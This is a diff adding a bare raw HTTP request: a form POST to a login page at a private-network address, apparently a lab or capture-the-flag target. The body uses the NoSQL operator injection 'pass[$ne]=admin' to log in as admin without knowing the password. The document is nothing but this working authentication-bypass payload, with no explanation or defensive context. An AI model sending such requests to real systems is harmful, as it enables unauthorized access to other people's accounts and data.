@@ -1,0 +1,5 @@
+POST /login.php HTTP/1.1
+Host: 10.10.191.255
+Content-Type: application/x-www-form-urlencoded
+
+user=admin&pass[$ne]=admin
